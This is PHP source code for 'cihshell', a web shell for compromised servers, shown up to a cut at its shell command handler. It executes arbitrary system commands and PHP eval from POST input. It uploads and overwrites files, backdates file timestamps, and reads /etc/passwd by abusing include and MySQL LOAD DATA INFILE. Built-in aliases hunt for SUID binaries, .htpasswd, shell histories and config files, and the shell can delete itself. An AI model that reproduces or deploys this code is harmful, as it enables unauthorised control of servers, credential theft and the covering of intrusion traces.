<?php
/*
######################################
------------ cihshell ----------------
      version: 0.99.1 [beta fix]

  everything you need is in here
--------------------------------------
########################### /cih.ms/ #
## add 'touch' & fix filesize by DCRM
*/

# Settings
#   all configurations here

  $auth = 1;     // set this to 0 to switch authentication off

    $login = 'test';
    $password = 'test';

  $errors = 0;  // set this to 1 to switch php errors on
  $stringnum = 1; // change it to 0, if you don't need string numbers in file viewer
  $hexdump_rows=20; // number of rows in hexdump

  $alias=array( // aliases for shell. edit them if you need.
'find suid files'=>'find / -type f -perm -04000 -ls',
'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
'find sgid files'=>'find / -type f -perm -02000 -ls',
'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
'find config.inc.php files'=>'find / -type f -name config.inc.php',
'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
'find config* files'=>'find / -type f -name "config*"',
'find config* files in current dir'=>'find . -type f -name "config*"',
'find all writable files'=>'find / -type f -perm -2 -ls',
'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
'find all writable directories'=>'find /  -type d -perm -2 -ls',
'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
'find all writable directories and files'=>'find / -perm -2 -ls',
'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
'find all service.pwd files'=>'find / -type f -name service.pwd',
'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
'find all .htpasswd files'=>'find / -type f -name .htpasswd',
'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
'find all .bash_history files'=>'find / -type f -name .bash_history',
'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
'find all .mysql_history files'=>'find / -type f -name .mysql_history',
'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
'list file attributes on a Linux second extended file system'=>'lsattr -va',
'show opened ports'=>'netstat -an',
);


  # you don't really need to edit it (;
  $f = array("SHELL" => "shell","EVAL" => "eval", "MySql Suite" => "mysql", "Server Information" => "server", "Env Informaion" => "envinfo", "PHPinfo" => "phpinfo", "Shell delete" => "delete");
  $ver = '0.99.1 [ beta {fix} ]';

# ok, let's start
#           ^^
session_start();
define("start",atime());
if(isset($_POST['eval'])){error_reporting(E_ALL&~E_NOTICE);}elseif($errors){error_reporting(E_ALL&~E_NOTICE);}else{error_reporting(0);}
ini_set('max_execution_time',0);
set_magic_quotes_runtime(0);
set_time_limit(0);
if(version_compare(phpversion(), '4.1.0') == -1){$_POST   = &$HTTP_POST_VARS; $_GET= &$HTTP_GET_VARS; $_SERVER = &$HTTP_SERVER_VARS; }
if (get_magic_quotes_gpc()){foreach ($_POST as $key=>$value){$_POST[$key] = stripslashes($value);}foreach ($_SERVER as $key=>$value){$_SERVER[$key] = stripslashes($value);}foreach ($_ENV as $key=>$value){$_SERVER[$key] = stripslashes($value);}foreach ($_FILES as $key=>$value){$_SERVER[$key] = stripslashes($value);}}
if ($auth == 0) {$_SESSION['logged'] = true;}



$safe_mode = ini_get("safe_mode"); if (!$safe_mode) {$safe_mode = 'off';} else {$safe_mode = 'On';}
$os = null; $dir = getcwd(); if(strlen($dir)>1 && $dir[1]==":") $os = "win"; else $os = "nix";
if(empty($dir)){ $opsy = getenv('OS');if(empty($opsy)){ $opsy = php_uname(); } if(empty($opsy)){ $opsy ="-"; $os = "nix"; } else { if(eregi("^win",$opsy)) { $os = "win"; }else { $os = "nix"; }}}
if($os == "nix"){$pwd = exec("pwd");} elseif($os == "win"){$pwd = exec("cd");} if(empty($pwd)) {$pwd = getcwd();}





# functions

function atime()
{list($usec, $sec) = explode(" ", microtime()); return ((float)$usec + (float)$sec);}

function fperms($file)
{$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';}
elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';}elseif (($perms & 0x6000) == 0x6000) {$info = 'b';}elseif (($perms & 0x4000) == 0x4000) {$info = 'd';}elseif (($perms & 0x2000) == 0x2000) {$info = 'c';}elseif (($perms & 0x1000) == 0x1000) {$info = 'p';}else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));$info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-');$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));return $info;}

function conv_size($size){
if($size >= 1073741824) {$size = round($size / 1073741824 * 100) / 100 . " GB";}elseif($size >= 1048576) {$size = round($size / 1048576 * 100) / 100 . " MB";}elseif($size >= 1024) {$size = round($size / 1024 * 100) / 100 . " KB";}else {$size = $size . " B";}return $size;}

function fileread($opfile)
{$fh = fopen($opfile, 'r'); if (!$fh){error('Could not open file',$ver);} while(!feof($fh)) {$line = fgets($fh); echo htmlspecialchars($line);}}

function fileread2($opfile,$stringnum)
{
 $fh = fopen($opfile, 'r'); if (!$fh){error('Could not open file',$ver);}
 echo '<table style="font-size:10px; width:100%; margin:0px;  background:#222; ">';

 if ($stringnum){
 $i=1;
 while(!feof($fh)) {
 $line = fgets($fh);
 echo '<tr style="background:#242424;"><td style="text-align:center;padding:3px; width:2%; border-right:1px solid #2e2e2e; color:#444;">'.$i.'</td><td>'.htmlspecialchars($line).'</td></tr>';
 $i++;
 }} else {
 while(!feof($fh)) {
 $line = fgets($fh);
 echo '<tr style="background:#242424;"><td>'.htmlspecialchars($line).'</td></tr>'; }
 }
  echo '</table><br/>';
}


function safq($query)
{
$arr = array();$res = mysql_query($query);
if (mysql_num_rows($res) > 0) {$x=0;while($row = mysql_fetch_row($res)){foreach($row as $i => $value) {$column = mysql_field_name($res,$i);$data["$column"] = $value;$arr[$x] = $data;}$x++;}}return $arr;}

function cmd_exec($cmd2)
{
if (isset($_POST['cmd'])) {$cmd=$_POST['cmd'];} else {$cmd = $cmd2;}
$result = '';
if(isset($_POST['cmdir'])){chdir($_POST['cmdir']);}
if(function_exists('system')){ob_start();system($cmd);$result = ob_get_contents();ob_end_clean();}
elseif(function_exists('exec')){exec($cmd,$result);$result = join("\n",$result);}
elseif(function_exists('shell_exec')){$result = shell_exec($cmd);}
elseif(function_exists('passthru')){ob_start();passthru($cmd);$result = ob_get_contents();ob_end_clean();}
elseif(is_resource($f = popen($cmd,"r"))){$result = "";while(!feof($f)) { $result .= fread($f,1024); }pclose($f);}
echo $result;
}

function code_eval()
{if (isset($_POST['eval'])){echo "\n result is:<br/><br/>";eval($_POST['eval']);}}

function error($text, $ver)
{
echo '
<div class="notice">
<p align="left" style="padding-left:15px;"><b>error occured:</b></p></div>
<div class="notice" style="margin-bottom:0px; border-bottom:2px solid #222;">
<textarea cols="100" rows="15" style="width:98%;" class="txt"> ';
echo $text;echo '</textarea></div>'; do_footer($ver); die();
}

function notice($text)
{
echo "<div class='notice'>$text</div>";
}


function do_header($f, $auth, $os, $path)
{
echo '<html><head>';
if (isset($_POST['cmd']) || isset($_POST['alias'])) {echo '<meta http-equiv="Content-Type" content="text/html; charset=cp866">'; } else{echo'<meta http-equiv="Content-Type" content="text/html; charset=windows-1251">';}
echo'
<title> CIH.[ms] WebShell </title>
<style>
body{background:#333; color:#999;font-family:Verdana, Arial;font-size:10px; padding:0px; margin:0px;}
.logo {color:#999; font-family:Verdana, Arial; font-size:23px; text-align:left; padding-left:5px; padding-top:0px;  margin-bottom:2px;}
.m {color:#888;font-family:Verdana, Arial;font-size:10px;  text-align:right; width:80px;background:#2c2c2c; border: 0px; border-right:1px solid #444; cursor:pointer; cursor:hand;}
.m2 {background:#2c2c2c;color:#999;font-size:10px;font-family:Verdana;border: 0px; padding:3px; width:100%; cursor:pointer; cursor:hand;}
.m2:hover {color:#ccc; background:#292929;}
.i {color:#555;font-family:Verdana, Arial;font-size:10px;  text-align:right;}
.notice {background:#252525; padding:4px; margin-bottom:2px;}
.footer {font-family:Verdana;font-size:10px;  background:#252525; color:#555; padding:4px; border-bottom:1px solid #222; border-left:1px solid #444; border-right:1px solid #444; text-align:center;}
.txt {background:#222; border:1px solid #333; color:#999; font-family:Verdana, Arial;font-size:10px; padding:5px;}
.butt1 {height:20px; width:20px; padding:2px;border:1px solid #222;background:#333; color:#999; font-family:Verdana, Arial;font-size:10px;}
.filet {color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;}
.ico {color:#555;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;}
.dir { cursor:pointer; cursor:hand;background:#252525;color:#999;font-weight:bold;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center; border:0px;}
.file { cursor:pointer; cursor:hand; background:#252525;color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:center;border:0px; margin:0px;}
.file:hover, .dir:hover {color:#ccc;}
.str{background:#242424; padding:8px; color:#999; font-size:10px; border-bottom:1px solid #292929; border-top:1px solid #292929; margin-top:15px; text-align:left}
.my{background:#252525;color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:left;border:0px;}
.form {background:#232323; height:22px; border:1px solid #2e2e2e; width:98%; padding:4px; color:#999; font-family:Verdana, Arial;font-size:10px; }
.fm {background:#272727; border:0px; color:#666;font-family:Verdana, Arial;font-size:10px; padding:3px;}
.fa {background:#222; color:#888;font-family:Verdana, Arial; font-size:10px;  text-align:right; border: 0px; width:100%; height:100%; padding:10px; text-align:center;}
.fa1 {background:#222; color:#888;font-family:Verdana, Arial; font-size:10px;  text-align:right; border: 0px; width:100%; height:100%; padding:2px; text-align:center;}
.fa:hover, .fa1:hover {background:#292929; color:#ccc;}
</style>
</head>
<body><div style="position:absolute; left:0px; top:0px; background:#333; text-align:center; padding-left:100px; padding-right:100px; height:90%">
<div style="background:#222; margin:0px; border-left:1px solid #444; border-right:1px solid #444; padding-left:0px; padding-right:0px;">
<table style="width:100%; height:25px;">
   <tr style="background:#2c2c2c;">
    <td style="color:#666; font-family:Verdana, Arial;font-size:10px; padding:3px; text-align:left; padding-left:6px;">
   cihshell on <b>'.$_SERVER['HTTP_HOST'].'</b>
    </td>';


echo "<form method='post' action='' style='padding:0px; margin:0px;'><input type='hidden' name='path' value='".$path."' class='m2'><td class='m'><input type='submit'  value='main' class='m2'></td>";
foreach($f as $k=>$v)
 {
  echo "
        <!-- $k -->
        <td class='m'><input type='submit' name='do' value='$v' class='m2'></td>
       ";
    }

if($auth){echo "<td class='m'><input type='submit' name='do' value='logout' class='m2'></td>";}
$disfun = ini_get('disable_functions');
$safe_mode = ini_get("safe_mode");
if (!$safe_mode) {$safe_mode = 'Off';} else {$safe_mode = 'On';}
$mysql_try = function_exists('mysql_connect');
if($mysql_try){ $mysql = 'On';} else {$mysql = 'Off';}
$pg_try = function_exists('pg_connect');
if($pg_try){$pg = 'On';}else{$pg = 'Off';}
$mssql_try = function_exists('mssql_connect');
if($mssql_try){$mssql = 'On';}else{$mssql = 'Off';}
$ora_try = function_exists('ocilogon');
if($ora_try){$ora = 'On';}else{$ora = 'Off';}
$curl_try = function_exists('curl_version');
if($curl_try) {$curl = 'On';} else {$curl = 'Off';}
$perms = fperms($path);
echo ' </tr>
</table>

<table style="width:100%; margin-top:5px;"><tr>
<td class="logo" style="width:120px;">CIH.<span style="color:#555">[</span><span style="color:#888">ms</span><span style="color:#555">]</span></td>
<td class="i" style="padding-right:5px; text-align:right;">
<nobr><b style="color:#666"><i>'.$perms.'</i></b>  <span style="color:#333">|</span></nobr>
<nobr>OS: <b>'.php_uname().'</b>  <span style="color:#333">|</span></nobr>
<nobr>safe mode: <b>'.$safe_mode.'</b>  <span style="color:#333">|</span></nobr>
<nobr>cURL: <b>'.$curl.'</b>  <span style="color:#333">|</span></nobr>
<nobr>MySQL: <b>'.$mysql.'</b>  <span style="color:#333">|</span></nobr>
<nobr>MSSQL: <b>'.$mssql.'</b> <span style="color:#333">|</span></nobr>
<nobr>PostgreSQL: <b>'.$pg.'</b> <span style="color:#333">|</span></nobr>
<nobr>Oracle: <b>'.$ora.'</b> <span style="color:#333">|</span></nobr>
PHP:  <b>'.phpversion().'</b>
</td>

</tr></table>
<div style="border-bottom:1px solid #232323; margin-bottom:2px; font-size:5px;">&nbsp;</div>';
if (!empty($disfun)){ echo '<div style="border-bottom:1px solid #232323; margin-bottom:2px; font-size:10px; color:#666; text-align:right; padding:5px;"><b>disabled functions:&nbsp;</b>'.$disfun.'</div>';}

}

function do_footer($ver)
{
echo '</div>
<div class="footer">
<span style="float:right; color:#333;">'.round(atime()-start,5).'</span>
<b><form method="post" style="margin:0px;">&copy;</b><input type="submit" value="cihshell" name="do"
style="border:0px; background:#252525; font-weight:bold;  padding:0px;" class="footer"/>&nbsp;&nbsp;version : '.$ver.'</form>
</div></div></body></html>';
}

# end of functions
#
if (!empty($_POST['login']) && !empty($_POST['password'])){
if ($_POST['login'] == $login && $_POST['password'] == $password){
$_SESSION['logged'] = true;} else {echo '
<html><head><style>body{background:#333;}</style><title>login </title></head>
<body><table style="margin-left:100px; margin-top:100px; background:#222; font-family:Verdana; font-size:10px; color:#999; padding:4px; width:100%:">
<tr>
<td><form method="post" style="margin:0px; padding:)px;">
login: <input type="text" name="login" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;
password: <input type="text" name="password" style="color:#999; border:1px solid #333; font-size:10px; background:#292929; padding:2px;">&nbsp;
<input type="submit"  style="color:#999; border:0px; font-size:10px; background:#262626; height:20px;; font-family:Verdana;" value="go"></form></td></tr><tr><td style="text-align:center; color:#666;">incorrect login or password</td></tr></table></body></html>'; die();}}

if (isset ($_POST['do']) && $_POST['do']=='logout') { unset($_SESSION['logged']); }

if ($_SESSION['logged'] == true){
if (isset($_POST['do']) && $_POST['do']=='phpinfo'){echo'<form method="post"><input type="submit" value="return back" style="width:100%;"></form>'; phpinfo();echo'<form method="post"><input type="submit" value="return back" style="width:100%;"></form>';die();}
if (isset($_POST['fdo']) && isset($_POST['ffile'])){
$ffile = $_POST['ffile'];
switch($_POST['fdo']){
case 'download':
$fl = $_POST['filename'];header("Content-type: application/x-octet-stream");header("Content-disposition: attachment; filename=".$fl.";");readfile($ffile);die();break;

case 'preview':
include($_POST['ffile']);die(); break;
}}

if(isset($_POST['f_file']))
{
 if ($_POST['f_file'] == "..")
  { $slashpos = strpos($_POST['f_path'], strrchr($_POST['f_path'], "/"));
$path = substr($_POST['f_path'], 0, $slashpos);
  } else {$path = $_POST['f_path']."/".$_POST['f_file'];}

}
elseif(isset($_POST['path']))
{$path = $_POST['path'];}
else {$path =  $pwd;}

if(isset($_POST['restore'])){$path = $pwd;}
$path = str_replace("\\", "/", $path);$path = str_replace("'", "", $path);



do_header($f, $auth, $os, $path);

echo '<table class="notice" style="width:100%; margin-bottom:7px; background:#272727"><tr>
<form method="post" action="" style="padding:0px; margin:0px;">
<td style="width:50px;">
<input type="hidden" value="'.$path.'" name="f_path">
<input type="submit" value=".." name="f_file" class="butt1">
<input type="submit" value="."  name="restore" class="butt1"></td>
<td></form>
<form method="post" action="" style="padding:0px; margin:0px;">
<input type="text" size="78"  value="'.$path.'" name="path" style=" width:90%; height:20px; padding:3px;border:1px solid #222;background:#2c2c2c; color:#999; font-family:Verdana, Arial;font-size:10px;" >
<input type="submit" value="go" class="butt1" style="width:30px; height:21px;">
</form></td>
</tr></table>';

# Safe-mode
#          working
if (isset($_POST['safe_mode'])){

echo "
<table style='width:100%; font-size:10px;'>
<tr style='background:#272727;' ><td  style='padding:10px; border-top:1px solid #2e2e2e;'><b>Try to read file(include):</b></td></tr>
<tr style='background:#242424;' ><td style='padding:10px;'><form action='' method='post' style='padding:0px; margin:0px;'>
<input type='text' name='sm_inc' style='width:80%;' class='form' value='/etc/passwd'/>
<input class='form' style='width:60px;'  type='submit' value='try'></form></td></tr>
<tr style='background:#252525;'><td  style='border-bottom:1px solid #2e2e2e;'>&nbsp;</td></tr>
<tr style='background:#222; font-size:1px;'><td>&nbsp;</td></tr>

<tr style='background:#272727;' ><td  style='padding:10px; border-top:1px solid #2e2e2e;'><b>Try to read file(include):</b></td></tr>
<tr style='background:#242424;' >
<td style='padding:10px;'>
<form action='' method='post' style='padding:0px; margin:0px;'>
<input type='text' name='mysql_host' style='width:15%;' class='form' value='localhost'/>
<span style='margin-left:5px; margin-right:5px;'>:</span><input type='text' name='mysql_port' style='width:40px' class='form' value='3306'/>
<span style='margin-left:5px; margin-right:5px;'>database:</span><input type='text' name='mysql_db' style='width:15%;' class='form' value='dbname'/>
<span style='margin-left:5px; margin-right:5px;'>login:</span><input type='text' name='mysql_login' style='width:15%;' class='form' value='dblogin'/>
<span style='margin-left:5px; margin-right:5px;'>password:</span><input type='text' name='mysql_passw' style='width:15%;' class='form' value='dbpassword'/>
<input type='text' name='mysql_file' style='margin-top:3px;width:700px;' class='form' value='/etc/passwd'/><br/>
<input type='submit' name='sm_mysql' value='try' class='form' style='margin-top:8px;width:50px;'>
</form></td></tr>
<tr style='background:#252525;'><td  style='border-bottom:1px solid #2e2e2e;'>&nbsp;</td></tr>
<tr style='background:#222; font-size:1px;'><td>&nbsp;</td></tr>
</table>
";
do_footer($ver); die();
}
# Safe_Mode functions
if (isset($_POST['sm_inc']))
{
echo "<textarea cols='170' rows='34' class='txt' style='width:98%;' > ";
include($_POST['sm_inc']);
echo "</textarea><br/><input type='button' class='form' value='go back'   onClick='javascript:history.back();'><br/><br/>";
do_footer($version); die();}

if(isset($_POST['sm_mysql']))
{
echo "<textarea cols='170' rows='34' class='txt' style='width:98%;' > ";
if(!isset($_POST['mysql_port']) || empty($_POST['mysql_port'])) { $_POST['mysql_port'] = "3306"; }
$db = mysql_connect($_POST['mysql_host'].':'.$_POST['mysql_port'],$_POST['mysql_login'],$_POST['mysql_passw']);
if($db){
if(mysql_select_db($_POST['mysql_db'],$db))
{$sql = "DROP TABLE IF EXISTS cih_tb;"; mysql_query($sql);
 $sql = "CREATE TABLE `cih_tb` ( `file` LONGBLOB NOT NULL );";
 mysql_query($sql);$sql = "LOAD DATA INFILE \"".$_POST['mysql_file']."\" INTO TABLE cih_tb;";
 mysql_query($sql);$sql = "SELECT * FROM cih_tb;";
$r = mysql_query($sql);
while(($r_sql = mysql_fetch_array($r))) { echo htmlspecialchars($r_sql[0]); }
$sql = "DROP TABLE IF EXISTS cih_tb;";
mysql_query($sql);
}else echo "Can\'t select database";
mysql_close($db);
}else echo "-- Could not connect to MySQL server";
echo "</textarea><br/><input type='button' class='form' value='go back'   onClick='javascript:history.back();'><br/><br/>";
do_footer($version);die();}



if ($safe_mode == "On" && !isset($_POST['safe_mode']))
{
notice('<form method="post" style="margin:0px;"><b>safe_mode</b> is <b>On.</b><input type="submit" name="safe_mode" value="Click on this message to start working" style="font-size:10px; color:#999; font-family:Verdana;border:0px; background:#252525;"/></form>');
}

if (isset($_POST['fileact'])){switch($_POST['fileact']){
case 'New File':
$cdir = $_POST['curdir'];
echo "<form method='post' action='' style='margin:0px; padding:0px;'><textarea cols='170' rows='34' class='txt' style='width:98%;' name='wrcont'></textarea>

<input type='hidden' name='path' value='".$_POST['curdir']."'><input type='hidden' name='curdir' value='".$_POST['curdir']."'>
<input type='text' name='nfname' class='form' style='width:28%; background:#252525;margin-bottom:1px; margin-right:1px;' value='file.txt'><input type='submit' name='wrfile' class='form' value='create file' style='width:70%'></form><br/>";
do_footer($ver); die();break;

case 'New Dir':
$curdir = $_POST['curdir'];
echo "<form method='post' action='' style='margin:0px;'><input type='hidden' name='curdir' value='$curdir'><input type='hidden' name='path' value='$curdir'><input type='text' name='dirname' class='form'  style='width:90%; margin-right:1px;' size='100'><input type='submit' style='width:60px;' class='form' value='go!'></form><br/>";
do_footer($ver);die();break;
case 'Upload':
if (isset($_FILES['userfile'])) {
$file = $_FILES['userfile'];
$curdir = $_POST['path'];
if(isset($_POST['newfilech']) && !empty($_POST['newfile'])) {$nfn=$_POST['newfile'];} else { $nfn = $file['name']; }
if($file['error']!=0) error($file['error']);
else{copy($file['tmp_name'], $curdir.'/'.$nfn);if(!file_exists($curdir.'/'.$file['name']))error("Upload failed. (Can't copy temp file ".$file['tmp_name']." into current directory)", $ver);else{notice("File ".$nfn." was uploaded successfuly..</div>");}}}
echo "<table style='width:100%; font-size:10px;'><tr style='background:#272727;' ><td  style='padding:10px; border-top:1px solid #2e2e2e;'><b>Upload from your computer:</b></td></tr>
<tr style='background:#242424;' ><td style='padding:10px;'><form action='' enctype='multipart/form-data' method='post' style='padding:0px; margin:0px;'><input type='hidden' name='path' value='$path'> <input type='hidden' name='fileact' value='Upload'><input name='userfile' size='85' value='' class='form' type='file' style='border:1px solid #444;'><br/><br/>New name :<input name='newfilech'  value='1' type='checkbox'><input type='text' name='newfile' style='width:20%;' class='form' value='filename.php'/><input type='submit' style='width:60px;' class='form' value='go!'></form></td></tr>
<tr style='background:#252525;'><td  style='border-bottom:1px solid #2e2e2e;'>&nbsp;</td></tr>
<tr style='background:#222; font-size:1px;'><td>&nbsp;</td></tr></table>";do_footer($ver);die();break;
}}
# File Manager : File actions
if(isset($_POST['newname'])) // rename
{rename($_POST['ffile'], $_POST['newname']);if(!file_exists($_POST['newname'])){error('Could not rename '); }notice("File was successfuly renamed to &nbsp;".$_POST['newname']."...");}
if(isset($_POST['newpath'])) //copy
{copy($_POST['ffile'], $_POST['newpath']);if(!file_exists($_POST['newpath'])){error('Could not copy file'); }echo " <div class='notice'>File was successfuly copied to &nbsp;<b>".$_POST['newpath']."</b>...</div>";}
if(isset($_POST['chmod'])) // chmod
{$a =  chmod($_POST['ffile'], $_POST['chmod']);if(!$a){error('Could not change permissions :o(', $ver);}echo " <div class='notice'>We hope that permissions for file were successfuly  changed to &nbsp;<b>".$_POST['chmod']."</b>&nbsp;^^</div>";}
if(isset($_POST['touch'])) // touch
{$dt = strtotime($_POST['touch']); if(!touch($_POST['ffile'], $dt)){ error('Could not change touch time...', $ver);} echo " <div class='notice'>We hope that touch for file were successfuly  changed to &nbsp;<b>".$_POST['touch']."</b>&nbsp;^^</div>";}
if (isset($_POST['ffile']) && isset($_POST['wrcont'])){ // write into file
$wrpath = $_POST['ffile']; $wrcont = $_POST['wrcont'];$fh = fopen($wrpath, 'w');if ($fh){fwrite($fh, $wrcont);fclose($fh); }else {error('Couldn\'t write to file..');}echo "<div class='notice'>File&nbsp;<b>$wrpath</b> &nbsp; was successfuly modified</div>";}
if (isset($_POST['nfname']) && isset($_POST['curdir']) && isset($_POST['wrcont'])) // new file
{$file1 = $_POST['curdir']."/".$_POST['nfname'];$fh = fopen($file1, 'w');$r = fwrite($fh, $_POST['wrcont']);fclose($fh);if (!file_exists($file1)){error('Could not create a file..');} else {notice("File was successfuly created");}}
if (isset($_POST['dirname']) && isset($_POST['curdir']))  // new directory
{$curdir = $_POST['curdir']; mkdir($curdir.'/'.$_POST['dirname']);if(file_exists($curdir.'/'.$_POST['dirname'])){notice($curdir.'/'.$_POST['dirname']."&nbsp;was successfuly created.");}else{error('An error occured while creating dir', $ver);}
}
# File Manager : Directory actions
if (isset($_POST['ddo']) && isset($_POST['dirr'])){
switch($_POST['ddo']){
case 'rename':
echo" <form method='post' action='' style='margin:0px;'><input type='hidden' name='path' value='".$pwd."'><input type='text' name='ffile' class='form'  value='".$_POST['dirr']."' style='width:40%'><span style='margin-left:4px; margin-right:4px;'>to</span><input type='text' name='newname' class='form'  value='".$_POST['dirr']."'  style='width:40%'><input type='submit' style='width:60px;' class='form' value='rename!'></form><br/>";
do_footer($ver);die();break;
   case 'delete':
rmdir($_POST['dirr']);if(file_exists($_POST['dirr'])){error('Could not delete directory');}notice($_POST['dirr']."&nbsp;was successfuly deleted.");do_footer($version);break;}}
if (isset($_POST['fdo']) && isset($_POST['ffile']) && $_POST['fdo']=='delete'){
unlink($_POST['ffile']);if(file_exists($_POST['ffile'])){error('Could not delete file');}notice("<b>".$_POST['ffile']."</b>&nbsp;was successfuly deleted.");break;
}if(isset($_POST['diract']))
{$path = $_POST['cmdir']; $perms = fperms($_POST['cmdir']);
echo"
<div  style='padding:2px;'><div style='background:#272727; padding:3px; margin-bottom:3px;text-align:left;'><b>File actions</b></div><div style='background:#272727; padding:3px;  font-size:9px; text-align:left;'>dir:$path&nbsp;&nbsp;|&nbsp;&nbsp; permissions: <b>$perms </b>&nbsp;&nbsp;</div><div style='padding:4px; padding-left:30px; font-size:9px; font-weight:bold; color:#999; text-align:left;'><form method='post' action=''><input type='hidden' name='dirr' value='$path'><input type='hidden' name='path' value='$path'><input type='hidden' name='curpath' value='$pp'><input type='hidden' name='filename' value='$ppp'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;><input type='submit' class='m' name='ddo' value='rename' style='margin-bottom:0px; background:#222;'><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;><input type='submit' class='m' name='ddo' value='delete' style='margin-bottom:0px; background:#222;'><br/><br/><br/></form></div><div style='background:#272727; font-size:9px;'>&nbsp;</div></div>";do_footer($ver);die();}
# switch $do
#
if (isset($_REQUEST['do']))
{
switch ($_REQUEST['do']){
case 'mysql':
if (isset($_POST['mysqlw_host'])){$dbhost = $_POST['mysqlw_host'];} else {$dbhost = 'localhost';}if (isset($_POST['mysqlw_db'])){$dbname  = $_POST['mysqlw_db'];} else {$dbname = 'dbname';}if (isset($_POST['mysqlw_login'])){$dblogin = $_POST['mysqlw_login'];}else {$dblogin = 'dblogin';}if (isset($_POST['mysqlw_passw'])){$dbpass = $_POST['mysqlw_passw'];}else {$dbpass = 'dbpassword';}if (isset($_POST['mysqlw_port'])){$dbport = $_POST['mysqlw_port'];} else {$dbport = '3306';}if (!empty($_POST['sql'])){echo '<div >';$sqlq =  $_POST['sql'];$db = mysql_connect($dbhost.':'.$dbport,$dblogin,$dbpass);if($db)
{if(!empty($_POST['mysqlw_db'])) { mysql_select_db($_POST['mysqlw_db'],$db); }$queries = explode(';',$sqlq);foreach($queries as $number=>$query) {
$number++;$r = safq($query); $error = mysql_error($db);if($error == 'Query was empty'){ break;}
echo "<div class='str' style='border-top:1px solid #333; '>query # <b>".$number."</b>:".htmlspecialchars($query)."</div>";
if ($error){ notice("Error : <b>".$error."</b>"); }
else {if(is_array($r)){echo '<table style="width:100%; background:#222;">';
if(is_array($r[0])){echo "<tr style='background:#292929; font-size:10px;'>";foreach($r[0] as $n=>$v){echo "<td style='padding:5px;'><b>$n</b></td>";}echo '</tr>';}foreach($r as $a){echo "<tr style='background:#232323;'>";
if(is_array($a)){foreach($a as $n=>$v){echo "<td class='my'>$v</td>";}}else{echo "<td class='file'>$a</td>";}echo '</tr>';}echo '</table>';}else{echo $r;}if(($rows = mysql_affected_rows($db))>=0) {
echo "<div class='str' style='margin-top:3px; border-bottom:1px solid #333; padding:3px;'>affected rows : <b>".$rows."</b></div>"; }
}} mysql_close($db);}else {notice('Error: Could not connect to database..');} echo '</div>'; }
echo "<form action='' method='post' style='margin:0px; margin-top:15px;'>
<table style='width:100%; height:40%'><tr><td valign='top' style='background:#272727; padding:3px;'><textarea  class='txt' cols='70' rows='15' name='sql' style='width:100%; height:99%'>";
if(isset($_POST['sql'])){echo $_POST['sql'];} else echo 'SHOW DATABASES;';
echo "</textarea></td><td style='width:150px; background:#272727;' valign='top' >
<input type='text' name='mysqlw_host' class='txt' style='margin:10px; height:24px;' value='$dbhost'/><input type='text' name='mysqlw_db'  class='txt' style='margin:10px; height:24px;'  value='$dbname'/><input type='text' name='mysqlw_login' class='txt' style='margin:10px; height:24px;'  value='$dblogin'/><input type='txt' name='mysqlw_passw'  class='txt' style='margin:10px; height:24px;'  value='$dbpass'/><input type='text' name='mysqlw_port'  class='txt' style='margin:10px; height:24px;'  value='$dbport'/><br/></td><tr><td colspan=2 valign='top' style='height:5%;'><input type='hidden' name='do' value='mysql'><input type='submit' class='txt' style='width:100%; margin:0px; margin-bottom:5px; ' value='go!'></td></tr></table></form><br/>";
do_footer($ver);   die(); break;
case 'server':
echo '<table class="str" style="width:100%">';foreach($_SERVER as $k=>$v)
{echo "<tr style='background:#262626; color:#666'><td style='padding:3px;'><b>$k</b></td><td>$v</td></tr>";}echo '</table>';do_footer($ver);
die();break;
case 'envinfo':
echo '<table class="str" style=" width:100%">';foreach($_ENV as $k=>$v)
{echo "<tr style='background:#262626; color:#666'><td style='padding:3px;'><b>$k</b></td><td style='padding:3px;'>$v</td></tr>";}echo '</table><br/>';do_footer($ver);die();break;
case 'delete':
if(unlink(substr(strrchr($_SERVER['PHP_SELF'],"/"),1))==true){echo "<div class='notice'>cihshell has been deleted successfully..bye-bye ): </div><br/><br/>"; do_footer($ver);}else{error('Unable to delete shell', $ver);} die();break;
case 'eval':
echo "<form method='post' action='' style='padding:0px; margin-top:5px;'><input type='hidden' name='do' value='eval'  style='border-bottom:1px solid #444;'> <textarea  name='eval' class='form' style='height:100px;'>";
if (isset($_POST['eval'])){echo $_POST['eval'];} else {echo 'code here (:';}
echo "</textarea><input type='submit' class='form' value='do' style='width:98%; margin-top:3px; border:0px; background:#262626;'></form><br/>";
if (isset($_POST['eval'])){
echo "<table  class='txt'  style='margin-left:13px; width:98%; height:60%'><tr><td valign='top'>";code_eval();echo "</td></tr></table><br/>";}
do_footer($ver);die(); break;
case 'shell':
